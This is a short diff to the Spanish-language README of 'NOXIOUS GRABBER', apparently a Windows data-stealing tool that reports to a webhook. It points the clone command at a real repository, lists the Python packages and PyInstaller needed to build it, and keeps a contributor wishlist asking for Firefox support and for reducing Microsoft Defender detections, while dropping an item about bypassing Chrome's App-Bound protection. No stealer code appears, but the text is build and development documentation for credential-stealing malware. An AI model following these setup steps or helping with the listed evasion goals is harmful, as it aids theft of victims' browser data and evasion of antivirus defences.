@@ -163,7 +163,7 @@ NOXIOUS GRABBER/
 ### 1. Clonar e instalar deps
 
 ```powershell
-git clone https://github.com/tu-usuario/noxious-grabber.git
+git clone https://github.com/NOXIOUS-SQUAD/NOXIOUS-GRABBER.git
 cd "NOXIOUS GRABBER"
 pip install requests psutil pyautogui Pillow pycryptodome pywin32 cryptography opencv-python numpy pefile
 pip install pyinstaller
@@ -275,7 +275,6 @@ WEBHOOK_AVATAR = "https://media1.giphy.com/media/5OPABBSgEmD48BCAwX/giphy.gif"
 
 ### Áreas donde más se necesita ayuda
 
-*   Fix App-Bound Chrome
 *   Soporte Firefox
 *   Reducir detecciones Defender (sin incluir crypter malicioso, solo técnicas de ofuscación legítimas)
 *   Tests en distintos Windows (10 22H2, 11 24H2)
